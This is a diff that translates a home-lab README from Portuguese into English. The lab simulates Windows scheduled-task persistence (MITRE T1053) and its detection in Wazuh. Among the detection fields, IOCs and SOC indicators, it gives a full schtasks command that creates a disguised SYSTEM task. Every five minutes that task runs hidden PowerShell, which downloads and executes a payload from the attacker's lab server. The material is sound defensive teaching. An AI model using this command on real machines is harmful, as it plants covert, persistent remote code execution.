@@ -7,15 +7,15 @@
 
 ---
 
-## Objetivo
+## Objective
 
-Simular a criação de uma scheduled task maliciosa via linha de comando, técnica amplamente usada por atacantes para estabelecer persistência após comprometimento inicial, e detectar o comportamento através do Wazuh SIEM.
+Simulate the creation of a malicious scheduled task via command line, a technique widely used by attackers to establish persistence after initial compromise, and detect the behavior through Wazuh SIEM.
 
 ---
 
-## Ambiente do Lab
+## Lab Environment
 
-| Máquina | Role | IP |
+| Machine | Role | IP |
 |---|---|---|
 | Kali Linux | Attacker / C2 Server | 192.168.56.104 |
 | Windows 10 | Target | 192.168.56.103 |
@@ -23,69 +23,69 @@ Simular a criação de uma scheduled task maliciosa via linha de comando, técni
 
 ---
 
-## Explicação Técnica
+## Technical Background
 
-Após comprometer uma máquina, atacantes frequentemente criam **scheduled tasks** para garantir que seu acesso seja mantido mesmo após reinicializações ou remoção de outros mecanismos. Essa técnica é classificada pelo MITRE ATT&CK como T1053 e é amplamente utilizada por grupos APT e ransomware.
+After compromising a machine, attackers frequently create **scheduled tasks** to ensure their access is maintained even after reboots or removal of other mechanisms. This technique is classified by MITRE ATT&CK as T1053 and is widely used by APT groups and ransomware.
 
-Neste lab, o atacante:
-1. Cria uma tarefa agendada disfarçada com nome legítimo (`WindowsUpdateHelper`)
-2. A tarefa executa um PowerShell oculto com um download cradle embutido, apontando para o servidor do atacante
-3. O Wazuh captura o Event ID 4688 com o `commandLine` completo do processo `schtasks.exe`, expondo toda a cadeia de persistência
+In this lab, the attacker:
+1. Creates a scheduled task disguised with a legitimate-looking name (`WindowsUpdateHelper`)
+2. The task executes a hidden PowerShell with an embedded download cradle pointing to the attacker's server
+3. Wazuh captures Event ID 4688 with the full `commandLine` of the `schtasks.exe` process, exposing the entire persistence chain
 
-Os indicadores críticos de detecção são:
-- Processo `schtasks.exe` iniciado a partir do `powershell.exe`
-- `commandLine` contendo `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` e uma URL externa
-- Task rodando como `SYSTEM` com intervalo de execução curto
+Critical detection indicators:
+- `schtasks.exe` process launched from `powershell.exe`
+- `commandLine` containing `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` and an external URL
+- Task running as `SYSTEM` with a short execution interval
 
 ---
 
-## Passo a Passo do Ataque
+## Attack Walkthrough
 
-### 1. Criar a Scheduled Task maliciosa
+### 1. Create the malicious Scheduled Task
 
-No Windows 10, com PowerShell aberto como Administrador:
+On Windows 10, with PowerShell opened as Administrator:
 
 ```powershell
 schtasks /create /tn "WindowsUpdateHelper" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command 'IEX(New-Object Net.WebClient).DownloadString(''http://192.168.56.104:8080/payload.txt'')'" /sc minute /mo 5 /ru SYSTEM
 ```
 
-**Anatomia do comando:**
+**Command breakdown:**
 
-| Parâmetro | Valor | Significado |
+| Parameter | Value | Meaning |
 |---|---|---|
-| `/tn` | `WindowsUpdateHelper` | Nome disfarçado de processo legítimo |
-| `/tr` | `powershell.exe ...` | PowerShell oculto com download cradle |
-| `/sc minute /mo 5` | A cada 5 minutos | Persistência contínua |
-| `/ru SYSTEM` | SYSTEM | Execução com privilégio máximo |
+| `/tn` | `WindowsUpdateHelper` | Name disguised as a legitimate process |
+| `/tr` | `powershell.exe ...` | Hidden PowerShell with embedded download cradle |
+| `/sc minute /mo 5` | Every 5 minutes | Continuous persistence |
+| `/ru SYSTEM` | SYSTEM | Execution with maximum privilege |
 
 ![Scheduled Task Created](images/01-schtasks-created.png)
 
 ---
 
-### 2. Detecção no Wazuh — Event ID 4688
+### 2. Detection in Wazuh — Event ID 4688
 
-No Wazuh Dashboard, o evento foi localizado com o filtro:
+In the Wazuh Dashboard, the event was located using the filter:
 
 ```
 data.win.eventdata.commandLine: *WindowsUpdateHelper*
 ```
 
-O Wazuh retornou **1 hit** — o processo `schtasks.exe` sendo criado pelo agente `DESKTOP-8LF9GEI`, rule ID `67027`, às `Mar 20, 2026 @ 19:25:49`.
+Wazuh returned **1 hit** — the `schtasks.exe` process created by agent `DESKTOP-8LF9GEI`, rule ID `67027`, at `Mar 20, 2026 @ 19:25:49`.
 
 ![Wazuh 4688 Detection](images/02-wazuh-4688-schtasks.png)
 
 ---
 
-### 3. Análise dos campos do evento
+### 3. Event field analysis
 
-Com o evento expandido no Wazuh, os campos confirmam toda a cadeia do ataque:
+With the event expanded in Wazuh, the fields confirm the full attack chain:
 
-| Campo | Valor |
+| Field | Value |
 |---|---|
 | `eventID` | `4688` |
 | `newProcessName` | `C:\Windows\System32\schtasks.exe` |
 | `parentProcessName` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
-| `commandLine` | Comando completo com `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` e URL do C2 |
+| `commandLine` | Full command with `-ExecutionPolicy Bypass`, `-WindowStyle Hidden` and C2 URL |
 | `subjectUserName` | `target` |
 | `targetUserSid` | `S-1-0-0` |
 
@@ -93,28 +93,28 @@ Com o evento expandido no Wazuh, os campos confirmam toda a cadeia do ataque:
 
 ---
 
-## Indicadores de Comprometimento (IOCs)
+## Indicators of Compromise (IOCs)
 
-| Indicador | Valor |
+| Indicator | Value |
 |---|---|
-| Processo | `schtasks.exe` |
-| Processo pai | `powershell.exe` |
-| Nome da task | `WindowsUpdateHelper` |
-| Flag suspeita | `-ExecutionPolicy Bypass -WindowStyle Hidden` |
-| Método | `IEX(New-Object Net.WebClient).DownloadString()` |
+| Process | `schtasks.exe` |
+| Parent process | `powershell.exe` |
+| Task name | `WindowsUpdateHelper` |
+| Suspicious flags | `-ExecutionPolicy Bypass -WindowStyle Hidden` |
+| Method | `IEX(New-Object Net.WebClient).DownloadString()` |
 | C2 | `http://192.168.56.104:8080/payload.txt` |
-| Privilégio | `SYSTEM` |
+| Privilege | `SYSTEM` |
 | Event ID | `4688` |
 
 ---
 
-## O que o SOC deve observar
+## What the SOC Should Look For
 
-- `schtasks.exe` iniciado a partir de `powershell.exe` ou `cmd.exe`
-- `commandLine` de scheduled task contendo `powershell`, `IEX`, `DownloadString`, `WebClient` ou URLs externas
-- Tasks criadas com `/ru SYSTEM` por usuários não administrativos
-- Nomes de tasks que imitam processos legítimos do Windows (`WindowsUpdate*`, `Microsoft*`, `System*`)
-- Intervalo de execução muito curto (`/sc minute`) combinado com comandos de rede
+- `schtasks.exe` launched from `powershell.exe` or `cmd.exe`
+- Scheduled task `commandLine` containing `powershell`, `IEX`, `DownloadString`, `WebClient` or external URLs
+- Tasks created with `/ru SYSTEM` by non-administrative users
+- Task names mimicking legitimate Windows processes (`WindowsUpdate*`, `Microsoft*`, `System*`)
+- Very short execution intervals (`/sc minute`) combined with network commands
 
 ---
 
@@ -126,10 +126,10 @@ schtasks /delete /tn "WindowsUpdateHelper" /f
 
 ---
 
-## Estrutura de Arquivos
+## File Structure
 
 ```
-lab-07-t1053-scheduled-task/
+lab-07-scheduled-task-T1053/
 ├── README.md
 └── images/
     ├── 01-schtasks-created.png
@@ -139,7 +139,7 @@ lab-07-t1053-scheduled-task/
 
 ---
 
-## Referências
+## References
 
 - [MITRE ATT&CK T1053 — Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/)
 - [Windows Event ID 4688 — Process Creation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688)
